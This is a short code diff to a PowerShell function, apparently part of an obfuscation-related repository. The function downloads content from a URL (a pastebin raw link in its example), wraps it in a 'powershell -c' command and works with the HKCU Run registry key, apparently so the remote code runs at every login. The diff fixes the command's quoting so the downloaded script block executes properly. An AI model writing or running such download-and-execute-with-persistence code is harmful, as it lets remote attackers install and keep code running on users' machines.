@@ -16,6 +16,8 @@ The RKEY_NAME defines the Registry key name.
 .EXAMPLE
 PS > Test-Download-File-Content-Execute "https://pastebin.com/raw/dLJMmDcm"
 
+.LINK
+https://github.com/FabianConP/ObfuscationCode
 #>
 
     [CmdletBinding()] Param(
@@ -29,7 +31,7 @@ PS > Test-Download-File-Content-Execute "https://pastebin.com/raw/dLJMmDcm"
     )
     # Downloads the file content
     [String] $FileContent = (New-Object System.Net.WebClient).DownloadString($URL)
-    [String] $pwsCommandForm = "powershell -c '$FileContent'"
+    [String] $pwsCommandForm = "powershell -c `"&{$FileContent}`""
     $runKeys = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
     
     # Check if it already exists a key with the given name
